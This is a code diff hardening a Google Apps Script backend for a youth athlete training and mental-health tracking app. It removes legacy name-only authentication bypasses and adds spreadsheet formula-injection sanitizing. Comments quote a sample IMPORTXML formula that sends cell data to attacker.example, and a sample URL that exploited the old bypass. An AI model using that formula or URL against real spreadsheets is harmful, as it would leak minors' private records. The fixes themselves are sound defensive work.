@@ -165,6 +165,9 @@ var HEADERS = [
   'nutritionRisks', 'nutritionAdviceStudent', 'nutritionAdviceParent', 'nutritionAdviceCoach',
   'studentLineText', 'parentLineText', 'coachLineText', 'nutritionLineText',
   'rawScoresJson', 'rawNutritionJson',
+  'reflectionGood', 'reflectionProblem', 'reflectionReason', 'reflectionFix',
+  'reportCredibility', 'reportCredibilityLevel', 'reportCredibilityFlags',
+  'painTrigger', 'painToldCoach', 'painNeedAdjust',
   // ===== 交叉辯論／教練複評 相關（新增，皆在最後，不影響舊資料） =====
   'recordId',                                                   // 每筆唯一 ID，供更新定位
   'coachPhysicalAvg', 'coachTechnicalAvg', 'coachFocusAvg',     // 教練複評：六大面向
@@ -225,10 +228,32 @@ var HEADERS = [
    ============================================================ */
 
 // GET：方便在瀏覽器直接測試，也支援 ?action=ping
+/*
+   GET 白名單（資安稽核 B-05）。
+
+   原本 doGet 會把 e.parameter 原封不動丟進 handleAction，等於「所有動作都能用
+   一條網址觸發」。這有兩個問題：
+   1. 攻擊只要一個連結就能送達（貼在群組、做成短網址），不需要架站。
+   2. query string 會留在瀏覽器歷史紀錄、分享紀錄與伺服器日誌裡；把
+      authToken 或選手姓名放進網址等於長期留存。
+
+   前端一律走 POST（見 js/09-settings-auth.js 的 postToWebApp），
+   所以限制 GET 不影響任何正常功能。保留 ping 與 getAuthConfig 供部署驗證，
+   兩者都不回傳任何個人資料。
+*/
+var GET_ALLOWED_ACTIONS = ['ping', 'getAuthConfig'];
+
 function doGet(e) {
   var action = (e && e.parameter && e.parameter.action) || 'ping';
   try {
     if (action === 'ping') return jsonOut({ ok: true, message: 'pong', time: new Date().toISOString() });
+    if (GET_ALLOWED_ACTIONS.indexOf(action) === -1) {
+      return jsonOut({
+        ok: false,
+        error: '此動作不接受 GET 請求，請改用 POST。',
+        hint: '若你是在驗證部署狀態，請用 ?action=ping。'
+      });
+    }
     return handleAction(action, e.parameter || {});
   } catch (err) {
     return jsonOut({ ok: false, error: String(err), stack: err && err.stack ? String(err.stack).slice(0, 4000) : '' });
@@ -598,6 +623,27 @@ function hashSecret(scope, secret) {
   return bytes.map(function (b) { var n = b < 0 ? b + 256 : b; return ('0' + n.toString(16)).slice(-2); }).join('');
 }
 
+/*
+   儲存格公式注入防護（資料稽核 C-02，P0）。
+
+   Google Sheets 對以 = + - @ 開頭的字串一律當作公式求值，而
+   appendRow()/setValues() 走的正是這條路徑。選手的自由文字（今日心得、
+   反思、請假理由…）原本原封不動寫進儲存格，因此輸入
+
+       =IMPORTXML("https://attacker.example/?d="&A2&B2,"//x")
+
+   會變成一條活公式，把同一張表裡其他選手的體重、疼痛、PIN 雜湊等資料
+   當作 query string 送到外部網址。這是可從選手手機觸發的真實外洩管道。
+
+   作法：在值前面加一個半形單引號。Sheets 會把它當成「強制文字」標記，
+   儲存格顯示的內容不變（不會多出一個引號），但不再求值。
+   只處理字串；數字、布林、Date 原樣通過，避免破壞既有型別。
+*/
+function sanitizeCellValue_(v) {
+  if (typeof v !== 'string') return v;
+  return /^[=+\-@\t\r]/.test(v) ? "'" + v : v;
+}
+
 function safeEqual(a, b) {
   a = String(a || ''); b = String(b || '');
   if (!a || a.length !== b.length) return false;
@@ -677,15 +723,31 @@ function updateObjectRow(sh, headers, rowNum, fields) {
   var values = sh.getRange(rowNum, 1, 1, headers.length).getValues()[0];
   Object.keys(fields).forEach(function (key) {
     var idx = headers.indexOf(key);
-    if (idx >= 0) values[idx] = fields[key] == null ? '' : fields[key];
+    if (idx >= 0) values[idx] = fields[key] == null ? '' : sanitizeCellValue_(fields[key]);
   });
   sh.getRange(rowNum, 1, 1, headers.length).setValues([values]);
 }
 
 // 清理同名重複的選手帳號：每個姓名只保留「最完整」的一筆，其餘刪除。
-// 修正早期匯入或手動停用造成的重複列（例如同一人同時出現 active 與 disabled 兩筆）。
-// 保留優先序：能正常登入(有PIN) > active > pending > locked > disabled；同級留有登入紀錄、建立較早者。
-// 回傳刪除筆數。被刪的通常是從未登入、沒有任何訓練紀錄綁定的空帳號，安全。
+/*
+   修正早期匯入或手動停用造成的重複列（例如同一人同時出現 active 與 disabled 兩筆）。
+
+   ⚠️ 安全性變更（資料稽核 C-01，P0）：
+   原本這個函式被 syncStudentAccountsFromRoster() 自動呼叫，而後者又被
+   getAccountAdminData()、activeStudentAccounts()、loadKpiStudentsLight_()
+   這些「一般讀取路徑」呼叫 —— 教練只要打開帳號管理或 KPI 名單就會執行。
+
+   它的「重複」判斷只用 normalizeName(studentName)，也就是純姓名字串。
+   國中同名同姓非常常見，兩位不同選手同名時，其中一位的帳號列（含 PIN、
+   狀態、鎖定紀錄）會被 deleteRow 永久刪除，無法復原。
+   原註解宣稱「被刪的通常是空帳號，安全」，但 score() 從未驗證這件事。
+
+   現在的作法：
+   1. 不再自動執行（呼叫點已從 syncStudentAccountsFromRoster 移除）。
+   2. 只刪「可證明是空殼」的重複列：沒有 PIN、沒有登入紀錄、狀態為 pending。
+      只要有任何一列是真實使用中的帳號，整組保留不動，改回報給教練人工處理。
+   3. 回傳 { removed, needsReview }，讓教練後台能顯示需要人工確認的同名清單。
+*/
 function dedupeStudentAccounts() {
   var sh = getStudentAccountsSheet();
   var last = sh.getLastRow();
@@ -708,20 +770,37 @@ function dedupeStudentAccounts() {
     if (o.lastLoginAt) s += 10;  // 真的用過
     return s;
   }
+  // 「空殼帳號」＝從未設過 PIN、從未登入、狀態仍是 pending。
+  // 只有這種列才可以安全移除；其餘一律保留並交給教練人工判斷。
+  function isEmptyShell(o) {
+    return !o.pinHash && !o.lastLoginAt && (!o.accountStatus || o.accountStatus === 'pending');
+  }
+
   var rowsToDelete = [];
+  var needsReview = [];
   Object.keys(groups).forEach(function (key) {
     var list = groups[key];
     if (list.length < 2) return;
+    var real = list.filter(function (x) { return !isEmptyShell(x.obj); });
+    if (real.length > 1) {
+      // 同名、且不只一個是「真的在用」的帳號 → 很可能是兩位不同選手，絕不自動刪。
+      needsReview.push({ name: list[0].obj.studentName, rows: list.map(function (x) { return x.row; }) });
+      return;
+    }
     list.sort(function (a, b) {
       var d = score(b.obj) - score(a.obj);
       if (d !== 0) return d;
       return String(a.obj.createdAt || '') < String(b.obj.createdAt || '') ? -1 : 1;  // 同分留較早建立的
     });
-    for (var j = 1; j < list.length; j++) rowsToDelete.push(list[j].row);  // 保留 list[0]，其餘刪除
+    for (var j = 1; j < list.length; j++) {
+      if (isEmptyShell(list[j].obj)) rowsToDelete.push(list[j].row);   // 只刪空殼
+      else needsReview.push({ name: list[j].obj.studentName, rows: [list[j].row] });
+    }
   });
   rowsToDelete.sort(function (a, b) { return b - a; });  // 由下往上刪，避免列號位移
   rowsToDelete.forEach(function (r) { sh.deleteRow(r); });
-  return rowsToDelete.length;
+  if (rowsToDelete.length) invalidateAccountIndex_();
+  return { removed: rowsToDelete.length, needsReview: needsReview };
 }
 
 var _rosterSynced_ = false;
@@ -729,7 +808,11 @@ function syncStudentAccountsFromRoster() {
   // 一次請求內只跑一次（activeStudentAccounts 與 loadKpiStudentsLight_ 都會呼叫）。
   if (_rosterSynced_) return 0;
   _rosterSynced_ = true;
-  dedupeStudentAccounts();  // 先清掉同名重複列，再補建缺少的帳號
+  /*
+     ⚠️ 已移除自動去重（資料稽核 C-01，P0）。
+     dedupeStudentAccounts() 會 deleteRow 真實帳號列，不該掛在這種
+     「教練一開後台就會跑」的讀取路徑上。改由教練後台的維護動作明確呼叫。
+  */
   var names = getRoster();
   var sh = getStudentAccountsSheet();
   // 一次讀進現有姓名建索引；原本逐名 findStudentAccountByName 會整表掃兩次（O(n²) 讀取）。
@@ -813,7 +896,20 @@ function logoutSession(data) {
   return { ok: true };
 }
 
-function legacyLoginEnabled() { return getProp('LEGACY_LOGIN_ENABLED') !== 'false'; }
+/*
+   舊制過渡登入開關。
+
+   ⚠️ 安全性變更（資安稽核 B-01）：預設由「開啟」改為「關閉」。
+   原本寫法是 !== 'false'，也就是只要沒特別設定就是開啟；配合下方各處
+   以 legacyRole+legacyName 當身分憑證的分支，等同於「知道選手姓名就能
+   讀到該名未成年選手的體重／疼痛／傷勢／心理紀錄」，且可用一條 GET 網址觸發。
+
+   現在必須在 Script Properties 明確設定 LEGACY_LOGIN_ENABLED = 'true' 才會開啟，
+   而且即使開啟，它也只用於「帳號遷移」（讓選手認領帳號、設定 PIN），
+   不再是任何私人資料的讀取或寫入旁路 —— 見 authorizedStudentName()、
+   mentalSession_()、updateRecordAuthorized()。
+*/
+function legacyLoginEnabled() { return getProp('LEGACY_LOGIN_ENABLED') === 'true'; }
 
 function getAuthConfig() {
   return { ok: true, legacyLoginEnabled: legacyLoginEnabled(), pinRules: { length: 4, maxFailures: LOGIN_MAX_FAILURES, lockMinutes: LOGIN_LOCK_MINUTES } };
@@ -980,11 +1076,19 @@ function authorizedStudentName(data, allowCoach) {
   if (session && session.role === 'parent' && session.consentStatus !== 'agreed') return { ok: false, error: '請先完成家長同意與個資告知。', consentRequired: true };
   if (session && session.role === 'coach' && allowCoach) return { ok: true, name: normalizeName(data.name || data.studentName), session: session };
   if (session && (session.role === 'student' || session.role === 'parent')) return { ok: true, name: session.studentName, studentId: session.studentId, session: session };
-  if (legacyLoginEnabled() && (data.legacyRole === 'student' || data.legacyRole === 'parent')) {
-    var legacyName = normalizeName(data.legacyName);
-    var requestedName = normalizeName(data.name || data.studentName);
-    if (legacyName && (!requestedName || requestedName === legacyName)) return { ok: true, name: legacyName, legacy: true };
-  }
+  /*
+     ⚠️ 已移除舊制姓名旁路（資安稽核 B-01，P0）。
+
+     移除前的邏輯是：只要 data.legacyRole 是 student/parent 且帶了 legacyName，
+     就直接核可該姓名的身分。legacyRole 與 legacyName 都是用戶端自己送來的字串，
+     不需要 PIN、不需要 authToken、不需要任何伺服器驗證，而 doGet 又會把
+     query string 原封不動當成 data，因此下面這條網址就能讀走任一選手的私人紀錄：
+
+         /exec?action=getRecentRecordsByName&legacyRole=student&legacyName=<姓名>
+
+     選手姓名並非機密（同隊同學、家長都知道），/exec 網址也公開在前端原始碼裡，
+     所以這等於沒有任何保護。舊制登入現在只能用於帳號遷移，不得換取任何資料。
+  */
   return { ok: false, error: '登入已失效，請重新登入。', authRequired: true };
 }
 
@@ -1042,10 +1146,9 @@ function addRecordAuthorized(data) {
     payload.studentId = session.studentId;
     studentRequest = true;
   } else if (!session || session.role !== 'coach') {
-    if (!legacyLoginEnabled() || data.legacyRole !== 'student' || normalizeName(data.legacyName) !== normalizeName(payload.name)) {
-      return { ok: false, error: '你沒有權限送出這筆資料。', forbidden: true };
-    }
-    studentRequest = true;
+    /* 已移除舊制寫入旁路（資安稽核 B-01）：legacyName 是用戶端自稱的身分，
+       等於任何人都能冒用任一選手的名義送出訓練紀錄，污染真實資料。 */
+    return { ok: false, error: '請先登入再送出資料。', authRequired: true };
   }
 
   var openKpi = null;
@@ -1119,7 +1222,7 @@ function saveCoachScore(data) {
     coachPrivateNote: String(p.coachPrivateNote || '').slice(0, 2000)
   };
   if (rowNum > 0) updateObjectRow(sh, COACH_SCORE_HEADERS, rowNum, fields);
-  else sh.appendRow(COACH_SCORE_HEADERS.map(function (h) { return fields[h] == null ? '' : fields[h]; }));
+  else sh.appendRow(COACH_SCORE_HEADERS.map(function (h) { return fields[h] == null ? '' : sanitizeCellValue_(fields[h]); }));
 
   var rec = getLastRecordByName(name);
   if (rec && formatDateCell(rec.date) === date && rec.recordId) {
@@ -1162,7 +1265,7 @@ function saveCoachReply(data) {
     confirmedByCoach: Object.prototype.hasOwnProperty.call(p, 'confirmedByCoach') ? (boolLike(p.confirmedByCoach) ? 'true' : 'false') : 'true',
     createdBy: 'coach'
   };
-  getCoachRepliesSheet().appendRow(COACH_REPLY_HEADERS.map(function (h) { return row[h] == null ? '' : row[h]; }));
+  getCoachRepliesSheet().appendRow(COACH_REPLY_HEADERS.map(function (h) { return row[h] == null ? '' : sanitizeCellValue_(row[h]); }));
 
   if (row.sourceRecordId) {
     try { updateRecord(row.sourceRecordId, { coachReply: row.replyText }); } catch (e) { /* 不影響獨立回覆表 */ }
@@ -1293,9 +1396,8 @@ function saveStudentTrait(data) {
       return { ok: false, error: '家長只能儲存自己孩子的特質。', forbidden: true };
     }
   } else {
-    if (!legacyLoginEnabled() || data.legacyRole !== 'student' || normalizeTraitName(data.legacyName) !== normalizeTraitName(name)) {
-      return { ok: false, error: '沒有登入權限，無法儲存特質資料。', forbidden: true };
-    }
+    /* 已移除舊制寫入旁路（資安稽核 B-01） */
+    return { ok: false, error: '沒有登入權限，無法儲存特質資料。', authRequired: true };
   }
 
   var sh = getStudentTraitsSheet();
@@ -1326,7 +1428,7 @@ function saveStudentTrait(data) {
     trainingTips: String(p.trainingTips || p.correction || current && current.trainingTips || '').trim(),
     updatedAt: nowIso()
   };
-  var values = STUDENT_TRAIT_HEADERS.map(function (h) { return row[h] == null ? '' : row[h]; });
+  var values = STUDENT_TRAIT_HEADERS.map(function (h) { return row[h] == null ? '' : sanitizeCellValue_(row[h]); });
   if (existing && existing.row) sh.getRange(existing.row, 1, 1, STUDENT_TRAIT_HEADERS.length).setValues([values]);
   else sh.appendRow(values);
   compactStudentTraitsSheet(sh);
@@ -1392,7 +1494,7 @@ function appendAiScoreFromPayload(payload) {
     parentFeedback: payload.feedbackParentText || '',
     coachFeedback: payload.feedbackCoachText || ''
   };
-  sh.appendRow(AI_SCORE_HEADERS.map(function (h) { return row[h] == null ? '' : row[h]; }));
+  sh.appendRow(AI_SCORE_HEADERS.map(function (h) { return row[h] == null ? '' : sanitizeCellValue_(row[h]); }));
 }
 function appendRiskFlagsFromPayload(payload) {
   if (!payload) return;
@@ -1423,7 +1525,7 @@ function appendRiskFlagsFromPayload(payload) {
       resolvedAt: '',
       coachNote: ''
     };
-    sh.appendRow(RISK_FLAG_HEADERS.map(function (h) { return row[h] == null ? '' : row[h]; }));
+    sh.appendRow(RISK_FLAG_HEADERS.map(function (h) { return row[h] == null ? '' : sanitizeCellValue_(row[h]); }));
   });
 }
 
@@ -1451,12 +1553,13 @@ function authAttendanceByStudent(data) {
 function updateRecordAuthorized(data) {
   var session = getAuthSession(data);
   if (!session) {
-    if (legacyLoginEnabled() && (data.legacyRole === 'student' || data.legacyRole === 'parent')) {
-      var legacyAllowed = data.legacyRole === 'parent' ? ['parentNote'] : ['studentResponse'];
-      var legacyFields = {};
-      legacyAllowed.forEach(function (key) { if (data.fields && Object.prototype.hasOwnProperty.call(data.fields, key)) legacyFields[key] = data.fields[key]; });
-      return updateRecord(data.recordId, legacyFields);
-    }
+    /*
+       ⚠️ 已移除舊制寫入旁路（資安稽核 B-02，P0）。
+       原本這條分支會直接 updateRecord(data.recordId, ...)，而 recordId 完全來自
+       用戶端、且不做任何「這筆紀錄是不是你的」檢查 —— 等於任何人都能改寫任一
+       選手紀錄的 studentResponse／parentNote 欄位。欄位白名單擋不住這個問題，
+       因為問題出在「改的是誰的紀錄」而不是「改哪個欄位」。
+    */
     return { ok: false, error: '登入已失效，請重新登入。', authRequired: true };
   }
   var fields = data.fields || {};
@@ -1486,18 +1589,43 @@ function findRecordById(recordId) {
    更新時只覆寫前端有提供的學生欄位，保留教練複評欄位與原 recordId。
 */
 function addRecord(payload) {
+  /*
+     併發保護（資料稽核 C-03）：底下是典型的 read-check-write —— 先掃全表找
+     「同一人同一天」的列，找不到才 appendRow。這段原本沒有任何鎖，而掃表
+     本身要花上一秒以上（700+ 列 × 157 欄），race window 很大。選手在訊號不好時
+     連點兩下送出，兩個執行實例可能都判斷「今天還沒有」，於是各自 append 一列，
+     同一人同一天出現兩筆，破壞「每日一筆」的前提，也讓出席人數統計多算。
+  */
+  var lock = LockService.getScriptLock();
+  try {
+    if (!lock.tryLock(15000)) {
+      return { ok: false, error: '系統忙碌中，請等幾秒後再送出一次（你的資料尚未儲存）。' };
+    }
+    return addRecordLocked_(payload);
+  } finally {
+    try { lock.releaseLock(); } catch (e) { /* 已釋放或逾時，忽略 */ }
+  }
+}
+
+function addRecordLocked_(payload) {
   var sheet = getSheet();
   var nameIdx = HEADERS.indexOf('name');
   var dateIdx = HEADERS.indexOf('date');
   var lastRow = sheet.getLastRow();
 
-  // 找同一天、同一人是否已有紀錄
+  // 找同一天、同一人是否已有紀錄。
+  // 只讀 name 與 date 兩欄，不再把整張表（157 欄）拉進記憶體——原本每次送出
+  // 都要讀 700+ 列 × 157 欄，是 6 分鐘執行逾時的主要來源。
   var existingRow = -1;
   if (lastRow >= 2 && payload.name && payload.date) {
-    var data = sheet.getRange(2, 1, lastRow - 1, HEADERS.length).getValues();
-    for (var i = 0; i < data.length; i++) {
-      if (String(data[i][nameIdx]) === String(payload.name) &&
-          formatDateCell(data[i][dateIdx]) === formatDateCell(payload.date)) {
+    var lo = Math.min(nameIdx, dateIdx);
+    var hi = Math.max(nameIdx, dateIdx);
+    var span = sheet.getRange(2, lo + 1, lastRow - 1, hi - lo + 1).getValues();
+    var nameOff = nameIdx - lo;
+    var dateOff = dateIdx - lo;
+    for (var i = 0; i < span.length; i++) {
+      if (String(span[i][nameOff]) === String(payload.name) &&
+          formatDateCell(span[i][dateOff]) === formatDateCell(payload.date)) {
         existingRow = i + 2;
         break;
       }
@@ -1513,7 +1641,7 @@ function addRecord(payload) {
       var key = HEADERS[c];
       if (key === 'recordId') continue; // 保留原 recordId，教練複評才不會斷鏈
       if (Object.prototype.hasOwnProperty.call(payload, key)) {
-        rowVals[c] = (payload[key] === undefined || payload[key] === null) ? '' : payload[key];
+        rowVals[c] = (payload[key] === undefined || payload[key] === null) ? '' : sanitizeCellValue_(payload[key]);
       }
     }
     rowVals[0] = new Date().toISOString(); // timestamp 用伺服器最新時間
@@ -1526,7 +1654,7 @@ function addRecord(payload) {
   // ---- 新增一列 ----
   var row = HEADERS.map(function (key) {
     var v = payload[key];
-    return (v === undefined || v === null) ? '' : v;
+    return (v === undefined || v === null) ? '' : sanitizeCellValue_(v);
   });
   if (!payload.timestamp) row[0] = new Date().toISOString();
   sheet.appendRow(row);
@@ -1818,7 +1946,7 @@ function upsertParentAccount(data) {
   if (found) updateObjectRow(sh, PARENT_HEADERS, found.row, fields);
   else {
     fields.parentId = Utilities.getUuid(); fields.createdAt = now;
-    sh.appendRow(PARENT_HEADERS.map(function (key) { return fields[key] == null ? '' : fields[key]; }));
+    sh.appendRow(PARENT_HEADERS.map(function (key) { return fields[key] == null ? '' : sanitizeCellValue_(fields[key]); }));
   }
   return { ok: true };
 }
@@ -2921,7 +3049,7 @@ function submitWeeklyKpi(data) {
     nextWeekGoal: String(data.nextWeekGoal || '').slice(0, 500),
     submittedAt: nowIso()
   };
-  sh.appendRow(WEEKLY_KPI_REPORT_HEADERS.map(function (h) { return row[h] == null ? '' : row[h]; }));
+  sh.appendRow(WEEKLY_KPI_REPORT_HEADERS.map(function (h) { return row[h] == null ? '' : sanitizeCellValue_(row[h]); }));
   return { ok: true, report: row };
 }
 
@@ -3034,7 +3162,7 @@ function mentalUpsert_(sh, headers, idKey, row) {
   var now = nowIso();
   if (!row.createdAt) row.createdAt = now;
   row.updatedAt = now;
-  var values = headers.map(function (h) { return row[h] == null ? '' : row[h]; });
+  var values = headers.map(function (h) { return row[h] == null ? '' : sanitizeCellValue_(row[h]); });
   var found = mentalRowById_(sh, headers, idKey, id);
   if (found && found.row) sh.getRange(found.row, 1, 1, headers.length).setValues([values]);
   else sh.appendRow(values);
@@ -3048,9 +3176,11 @@ function mentalSession_(data, allowParent) {
     if (session.role === 'parent' && !allowParent) return { ok: false, error: '家長不可讀取原始心理紀錄。', forbidden: true };
     return { ok: true, session: session };
   }
-  if (legacyLoginEnabled() && (data.legacyRole === 'student' || (allowParent && data.legacyRole === 'parent'))) {
-    return { ok: true, session: { role: data.legacyRole, studentName: normalizeName(data.legacyName), studentId: '', teamId: TEAM_ID_DEFAULT, consentStatus: 'agreed' }, legacy: true };
-  }
+  /*
+     ⚠️ 已移除舊制姓名旁路（資安稽核 B-01，P0）。
+     心理準備模組存的是焦慮分數、負面自我對話、賽後反思這類最敏感的內容，
+     原本卻能只靠用戶端自稱的 legacyRole + legacyName 取得。一律要求真實 session。
+  */
   return { ok: false, error: '登入已失效，請重新登入。', authRequired: true };
 }
 
@@ -3216,6 +3346,11 @@ function saveMentalDailyRecord(data) {
     reflection: String(p.reflection || '').slice(0, 2000), needCoachHelp: boolLike(p.needCoachHelp) ? 'true' : 'false',
     createdAt: p.createdAt || now
   };
+  var duplicate = findMentalDailyDuplicate_(row);
+  if (duplicate && duplicate.recordId) {
+    row.recordId = duplicate.recordId;
+    row.createdAt = duplicate.createdAt || row.createdAt;
+  }
   return { ok: true, data: mentalUpsert_(getMentalDailyRecordsSheet(), MENTAL_DAILY_RECORD_HEADERS, 'recordId', row) };
 }
 
@@ -3223,6 +3358,23 @@ function getMentalDailyRecords(data) {
   var who = mentalRequestedStudent_(data, true, false);
   if (!who.ok) return who;
   return { ok: true, data: mentalFilterRows_(readSheetObjects(getMentalDailyRecordsSheet(), MENTAL_DAILY_RECORD_HEADERS), who, data.competitionId || '') };
+}
+
+function findMentalDailyDuplicate_(row) {
+  var rows = readSheetObjects(getMentalDailyRecordsSheet(), MENTAL_DAILY_RECORD_HEADERS);
+  for (var i = 0; i < rows.length; i++) {
+    var r = rows[i];
+    if (String(r.recordId || '') === String(row.recordId || '')) return r;
+    var sameAthlete = !r.athleteId || !row.athleteId || String(r.athleteId || '') === String(row.athleteId || '');
+    if (normalizeName(r.studentName) === normalizeName(row.studentName) &&
+        sameAthlete &&
+        String(formatDateCell(r.date || '')) === String(formatDateCell(row.date || '')) &&
+        String(r.taskName || '') === String(row.taskName || '') &&
+        String(r.competitionId || '') === String(row.competitionId || '')) {
+      return r;
+    }
+  }
+  return null;
 }
 
 function saveMentalSelfTalk(data) {
@@ -3399,7 +3551,16 @@ function getMentalCoachDashboard(data) {
   var refs = readSheetObjects(getMentalReflectionsSheet(), MENTAL_REFLECTION_HEADERS);
   var compMap = {};
   comps.forEach(function (c) { compMap[String(c.competitionId)] = c; });
-  var rows = participants.map(function (p) {
+  var rowSources = participants.slice();
+  var seen = {};
+  rowSources.forEach(function (p) { seen[normalizeName(p.studentName) + '::' + String(p.competitionId || '')] = true; });
+  daily.forEach(function (r) {
+    var key = normalizeName(r.studentName) + '::' + String(r.competitionId || '');
+    if (!normalizeName(r.studentName) || seen[key]) return;
+    seen[key] = true;
+    rowSources.push({ studentName: r.studentName, athleteId: r.athleteId || '', competitionId: r.competitionId || '', status: 'active' });
+  });
+  var rows = rowSources.map(function (p) {
     var who = { session: auth.session, name: p.studentName, athleteId: p.athleteId };
     var c = compMap[String(p.competitionId)] || {};
     var dr = mentalFilterRows_(daily, who, p.competitionId);
@@ -3416,6 +3577,21 @@ function getMentalCoachDashboard(data) {
     };
     var alerts = mentalAlerts_(dr, st, gs, ps, c);
     var days = c.competitionDate ? Math.ceil((new Date(formatDateCell(c.competitionDate) + 'T00:00:00').getTime() - new Date(todayStr() + 'T00:00:00').getTime()) / 86400000) : '';
+    var today = sorted.filter(function (r) { return String(formatDateCell(r.date || '')) === todayStr(); })[0] || {};
+    var doneRows = sorted.filter(function (r) { return boolLike(r.completed); });
+    var lastDone = doneRows[0] || {};
+    var lastThree = sorted.slice(0, 3);
+    var sameIssue = lastThree.length >= 3 && lastThree.every(function (r) { return String(r.taskType || '') && String(r.taskType || '') === String(lastThree[0].taskType || ''); });
+    var threeNeutral = lastThree.length >= 3 && lastThree.every(function (r) { return String(r.reflection || '') === '差不多'; });
+    var daysSinceLastDone = lastDone.date ? Math.floor((new Date(todayStr() + 'T00:00:00').getTime() - new Date(formatDateCell(lastDone.date) + 'T00:00:00').getTime()) / 86400000) : 999;
+    var simpleCare = [];
+    if (dr.some(function (r) { return boolLike(r.needCoachHelp); })) simpleCare.push({ label: '需要教練關心', reason: '選手主動要求教練協助', priority: 1 });
+    if (threeNeutral) simpleCare.push({ label: '需要教練關心', reason: '連續三次選擇差不多', priority: 2 });
+    if (sameIssue) simpleCare.push({ label: '需要教練關心', reason: '同一心理狀況持續出現', priority: 3 });
+    if (weekly.weekRate < 60) simpleCare.push({ label: '需要教練關心', reason: '一週完成率低於60%', priority: 4 });
+    if (daysSinceLastDone > 3) simpleCare.push({ label: '需要教練關心', reason: '超過三天沒有完成心理任務', priority: 5 });
+    var careReasons = simpleCare.concat(alerts);
+    var priority = careReasons.reduce(function (min, a) { return Math.min(min, Number(a.priority || 9)); }, 99);
     return {
       studentName: p.studentName, athleteId: p.athleteId, competitionId: p.competitionId,
       competitionName: c.competitionName || '', countdownDays: days,
@@ -3423,8 +3599,21 @@ function getMentalCoachDashboard(data) {
       confidenceTrend: avg('confidenceScore'), anxietyTrend: avg('anxietyScore'), focusTrend: avg('focusScore'),
       scenarioPlanStatus: ps.length ? ps.filter(function (x) { return String(x.status || '') !== '尚未建立'; }).length + '/' + ps.length : '尚未建立',
       lastRecordDate: sorted[0] ? sorted[0].date : '',
-      needCare: alerts.length > 0, careReasons: alerts
+      todayIssue: today.taskType || '',
+      todayTask: today.taskName || '',
+      todayCompleted: boolLike(today.completed),
+      todayFeeling: today.reflection || '',
+      lastCompletedAt: lastDone.completedAt || '',
+      repeatedIssue: sameIssue ? String(lastThree[0].taskType || '') : '',
+      daysSinceLastDone: daysSinceLastDone,
+      needCare: careReasons.length > 0,
+      careReasons: careReasons,
+      priority: priority
     };
+  });
+  rows.sort(function (a, b) {
+    if (a.priority !== b.priority) return a.priority - b.priority;
+    return String(a.studentName || '').localeCompare(String(b.studentName || ''), 'zh-Hant');
   });
   return { ok: true, data: { competitions: comps, rows: rows } };
 }
@@ -3507,26 +3696,12 @@ function getAppDataAuthorized(data) {
     }
     return { ok: true, data: value };
   }
-  if (legacyLoginEnabled() && (data.legacyRole === 'student' || data.legacyRole === 'parent')) {
-    var legacySession = { role: data.legacyRole, studentName: normalizeName(data.legacyName) };
-    if (legacySession.studentName && appDataKeyAllowedForSession(data.key, legacySession)) {
-      var legacyValue = getAppData(data.key);
-      if (legacyValue && typeof legacyValue === 'object') {
-        legacyValue = JSON.parse(JSON.stringify(legacyValue));
-        if (String(data.key || '').indexOf('mental-prep:') === 0 && legacySession.role === 'parent') {
-          return { ok: true, data: {
-            studentName: legacyValue.studentName || legacySession.studentName || '',
-            coachPublicAdvice: legacyValue.coachPublicAdvice || '',
-            updatedAt: legacyValue.updatedAt || ''
-          }, legacy: true };
-        }
-        delete legacyValue.coachNote;
-        if (String(data.key || '').indexOf('mental-prep:') === 0) delete legacyValue.coachPrivateNote;
-        if (legacySession.role === 'parent') delete legacyValue.studentNote;
-      }
-      return { ok: true, data: legacyValue, legacy: true };
-    }
-  }
+  /*
+     ⚠️ 已移除舊制讀取旁路（資安稽核 B-01，P0）。
+     appdata 存的是教練指定任務、選手個人檔案、心理準備等內容，
+     原本只要自稱 legacyRole + legacyName 就能讀走。欄位遮蔽（delete coachNote 等）
+     擋不住核心問題：身分本身就是假的。
+  */
   return { ok: false, error: '登入已失效，請重新登入。', authRequired: true };
 }
 
@@ -3591,52 +3766,12 @@ function setAppDataAuthorized(data) {
     }
     return writeAppData(data.key, data.value);
   }
-  if (legacyLoginEnabled() && data.legacyRole === 'student') {
-    var legacySession = { role: 'student', studentName: normalizeName(data.legacyName) };
-    if (legacySession.studentName && appDataKeyAllowedForSession(data.key, legacySession)) {
-      var key = String(data.key || '');
-      if (key.indexOf('motto:') === 0) return writeAppData(key, { text: String((data.value && data.value.text) || '').slice(0, 120) });
-      if (key.indexOf('task:') === 0) {
-        var current = getAppData(key) || {};
-        current.completion = String((data.value && data.value.completion) || '').slice(0, 20);
-        current.studentNote = String((data.value && data.value.studentNote) || '').slice(0, 1000);
-        return writeAppData(key, current);
-      }
-      if (key.indexOf('trait:') === 0) {
-        var trait = getAppData(key) || {};
-        var incoming = data.value || {};
-        if (incoming.studentName) trait.studentName = normalizeName(incoming.studentName);
-        if (incoming.label) trait.label = String(incoming.label).slice(0, 40);
-        if (incoming.typeKey) trait.typeKey = String(incoming.typeKey).slice(0, 40);
-        if (incoming.description) trait.description = String(incoming.description).slice(0, 600);
-        if (incoming.keywords) trait.keywords = incoming.keywords;
-        if (incoming.communication) trait.communication = String(incoming.communication).slice(0, 400);
-        if (incoming.encouragement) trait.encouragement = String(incoming.encouragement).slice(0, 400);
-        if (incoming.correction) trait.correction = String(incoming.correction).slice(0, 400);
-        if (incoming.competitionReminder) trait.competitionReminder = String(incoming.competitionReminder).slice(0, 400);
-        if (incoming.setbackResponse) trait.setbackResponse = String(incoming.setbackResponse).slice(0, 400);
-        if (incoming.parentAdvice) trait.parentAdvice = String(incoming.parentAdvice).slice(0, 400);
-        if (incoming.avoid) trait.avoid = String(incoming.avoid).slice(0, 400);
-        if (incoming.rawScore) trait.rawScore = incoming.rawScore;
-        if (incoming.answers) trait.answers = incoming.answers;
-        trait.completedAt = incoming.completedAt || trait.completedAt || nowIso();
-        trait.updatedAt = nowIso();
-        trait.updatedBy = 'student';
-        trait.version = incoming.version || trait.version || 1;
-        return writeAppData(key, trait);
-      }
-      if (key.indexOf('mental-prep:') === 0) {
-        var mental = data.value || {};
-        var currentMental = getAppData(key) || {};
-        mental.studentName = normalizeName(legacySession.studentName);
-        mental.coachPublicAdvice = currentMental.coachPublicAdvice || '';
-        mental.coachPrivateNote = currentMental.coachPrivateNote || '';
-        mental.updatedAt = nowIso();
-        mental.updatedBy = 'student';
-        return writeAppData(key, mental);
-      }
-    }
-  }
+  /*
+     ⚠️ 已移除舊制寫入旁路（資安稽核 B-01，P0）。
+     原本只要自稱 legacyRole=student + legacyName，就能寫入該姓名的 motto/task/trait/
